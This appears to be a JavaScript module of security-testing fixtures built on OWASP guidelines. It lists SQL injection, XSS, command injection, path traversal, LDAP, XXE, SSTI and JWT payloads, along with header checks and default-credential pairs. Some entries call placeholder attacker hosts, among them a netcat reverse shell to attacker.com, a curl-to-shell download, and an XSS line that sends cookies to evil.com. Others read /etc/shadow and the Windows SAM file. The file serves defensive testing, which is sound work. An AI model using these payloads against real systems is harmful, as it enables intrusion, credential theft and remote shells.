/**
 * Security test patterns based on OWASP guidelines
 */
export const SecurityPatterns = {
    // SQL Injection payloads
    sqlInjection: [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "'; DROP TABLE users; --",
        "1; SELECT * FROM users",
        "' UNION SELECT null, username, password FROM users --",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' OR 1=1#",
        "admin'--",
        "') OR ('1'='1",
        "1 OR 1=1",
        "' OR ''='",
        "' OR 'x'='x",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' UNION SELECT NULL--",
        "-1' UNION SELECT 1,2,3--"
    ],

    // XSS payloads
    xss: [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        "javascript:alert('XSS')",
        '<body onload=alert("XSS")>',
        '<img src="javascript:alert(\'XSS\')">',
        '<iframe src="javascript:alert(\'XSS\')">',
        '"><img src=x onerror=alert(1)>',
        '<script>document.location="http://evil.com/?c="+document.cookie</script>',
        '<div onmouseover="alert(\'XSS\')">hover me</div>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror="alert(1)">',
        '<audio src=x onerror=alert(1)>'
    ],

    // Command injection payloads
    commandInjection: [
        '; ls -la',
        '| cat /etc/passwd',
        '`id`',
        '$(whoami)',
        '& dir',
        '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '; cat /etc/shadow',
        '| nc -e /bin/sh attacker.com 4444',
        '`curl http://attacker.com/shell.sh | sh`',
        '$(wget http://attacker.com/malware)',
        '& ping -c 10 attacker.com',
        '; sleep 10',
        '| sleep 10'
    ],

    // Path traversal payloads
    pathTraversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '..%252f..%252f..%252fetc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....\/....\/....\/etc/passwd',
        '..%c0%af..%c0%af..%c0%afetc/passwd',
        '..%255c..%255c..%255cwindows/system32/config/sam',
        '/var/www/../../etc/passwd',
        'file:///etc/passwd'
    ],

    // LDAP injection payloads
    ldapInjection: [
        '*',
        '*)(&',
        '*)(uid=*))(|(uid=*',
        'admin)(&)',
        'admin)(|(password=*))',
        '*)(%26',
        '*))%00'
    ],

    // XML injection payloads (XXE)
    xxe: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
    ],

    // SSTI (Server-Side Template Injection) payloads
    ssti: [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config}}',
        '{{self.__class__.__mro__[2].__subclasses__()}}',
        '${T(java.lang.Runtime).getRuntime().exec("id")}',
        '#{7*7}',
        '*{7*7}',
        '@(7*7)'
    ],

    // JWT attacks
    jwt: [
        // None algorithm
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.',
        // Algorithm confusion
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
    ],

    // CORS misconfiguration tests
    corsOrigins: [
        'null',
        'http://evil.com',
        'http://localhost.evil.com',
        'http://evil-localhost.com'
    ],

    // Security headers to check
    securityHeaders: [
        { header: 'X-Content-Type-Options', expected: 'nosniff' },
        { header: 'X-Frame-Options', expected: ['DENY', 'SAMEORIGIN'] },
        { header: 'X-XSS-Protection', expected: '1; mode=block' },
        { header: 'Strict-Transport-Security', expected: /max-age=\d+/ },
        { header: 'Content-Security-Policy', expected: /.+/ },
        { header: 'Referrer-Policy', expected: /.+/ },
        { header: 'Permissions-Policy', expected: /.+/ }
    ],

    // Sensitive data patterns to check in responses
    sensitiveDataPatterns: [
        /password["\s]*[:=]["\s]*[^"}\s]+/i,
        /secret["\s]*[:=]["\s]*[^"}\s]+/i,
        /api[_-]?key["\s]*[:=]["\s]*[^"}\s]+/i,
        /token["\s]*[:=]["\s]*[^"}\s]+/i,
        /private[_-]?key/i,
        /-----BEGIN.*PRIVATE KEY-----/,
        /credit[_-]?card/i,
        /\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b/, // Credit card pattern
        /\b\d{3}-\d{2}-\d{4}\b/, // SSN pattern
        /bearer\s+[a-zA-Z0-9\-_.]+/i
    ],

    // CSRF bypass techniques
    csrfBypass: [
        { method: 'Remove CSRF token', technique: 'Submit without token' },
        { method: 'Empty CSRF token', technique: 'Submit with empty token' },
        { method: 'Invalid CSRF token', technique: 'Submit with random token' },
        { method: 'Reuse CSRF token', technique: 'Use token from another session' },
        { method: 'Change request method', technique: 'Change POST to GET' }
    ],

    // Authentication bypass payloads
    authBypass: [
        { username: 'admin', password: "' OR '1'='1" },
        { username: "admin'--", password: 'anything' },
        { username: 'admin', password: 'admin' },
        { username: 'administrator', password: 'administrator' },
        { username: 'root', password: 'root' },
        { username: 'test', password: 'test' }
    ],

    // Rate limiting test parameters
    rateLimiting: {
        requestCount: 100,
        windowMs: 60000,
        expectedLimit: 60
    },

    // Session management tests
    sessionTests: [
        'Session fixation',
        'Session timeout',
        'Concurrent sessions',
        'Session invalidation on logout',
        'Session token in URL',
        'Secure flag on cookies',
        'HttpOnly flag on cookies',
        'SameSite attribute'
    ]
};

/**
 * OWASP Top 10 2021 categories
 */
export const OWASPTop10 = {
    'A01:2021': 'Broken Access Control',
    'A02:2021': 'Cryptographic Failures',
    'A03:2021': 'Injection',
    'A04:2021': 'Insecure Design',
    'A05:2021': 'Security Misconfiguration',
    'A06:2021': 'Vulnerable and Outdated Components',
    'A07:2021': 'Identification and Authentication Failures',
    'A08:2021': 'Software and Data Integrity Failures',
    'A09:2021': 'Security Logging and Monitoring Failures',
    'A10:2021': 'Server-Side Request Forgery (SSRF)'
};

/**
 * ISTQB Testing Techniques
 */
export const ISTQBTechniques = {
    blackBox: [
        'Equivalence Partitioning',
        'Boundary Value Analysis',
        'Decision Table Testing',
        'State Transition Testing',
        'Use Case Testing'
    ],
    whiteBox: [
        'Statement Coverage',
        'Decision Coverage',
        'Condition Coverage',
        'Multiple Condition Coverage',
        'Path Coverage'
    ],
    experienceBased: [
        'Error Guessing',
        'Exploratory Testing',
        'Checklist-based Testing'
    ]
};

